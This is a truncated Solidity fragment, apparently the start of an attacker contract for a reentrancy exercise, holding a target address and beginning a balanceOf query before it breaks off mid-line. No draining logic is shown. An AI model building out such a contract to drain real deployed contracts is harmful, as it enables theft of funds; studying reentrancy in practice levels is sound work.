pragma solidity ^0.6.12;

contract ReentrancyFinal {
    address payable public reentrance;

    constructor(address payable _reentrance) public {
        reentrance = _reentrance;
    }

    function getMyBalance() internal view returns (uint256) {
        (bool success, bytes memory data) = reentrance.call(abi.encodeWithSignature("balanceOf(address)\